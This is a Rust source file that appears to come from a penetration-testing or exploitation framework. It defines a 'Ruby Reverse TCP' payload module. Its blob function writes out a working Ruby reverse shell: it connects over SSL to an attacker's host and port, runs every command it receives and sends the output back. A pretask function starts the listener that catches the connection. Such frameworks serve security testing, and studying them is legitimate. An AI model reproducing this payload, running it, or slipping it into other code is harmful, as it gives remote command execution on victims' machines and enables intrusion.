use crate::core::{
    handler::generic_tcp_handler::GenericTcpHandler,
    opt::Opt,
    payload::{reverse::Reverse, Info, Payload},
};

// TODO: maybe can remove public
pub struct RubyReverseTcp {
    pub reverse: Reverse,
}

impl Payload for RubyReverseTcp {
    fn default() -> Self {
        RubyReverseTcp {
            reverse: Reverse::default(),
        }
    }

    fn pretask(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut handler = GenericTcpHandler::new(&self.reverse.lhost, &self.reverse.lport)?;
        handler.listen_for_one()?;
        Ok(())
    }

    fn blob(&self) -> Vec<u8> {
        let blob = format!("require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"{}\",\"{}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){{|io|c.print io.read}}end", self.reverse.lhost, self.reverse.lport);
        blob.into_bytes()
    }

    fn info(&self) -> Info {
        Info {
            descriptive_name: "Ruby Reverse TCP".to_string(),
            module_path: "payload/ruby_reverse_tcp".to_string(),
            kind: self.kind().to_string(),
            description: None,
            license: None,
            author: None,
            references: None,
            platform: None,
        }
    }

    fn opts(&self) -> Vec<Opt> {
        let opts: Vec<Opt> = Vec::new();
        opts
    }
}
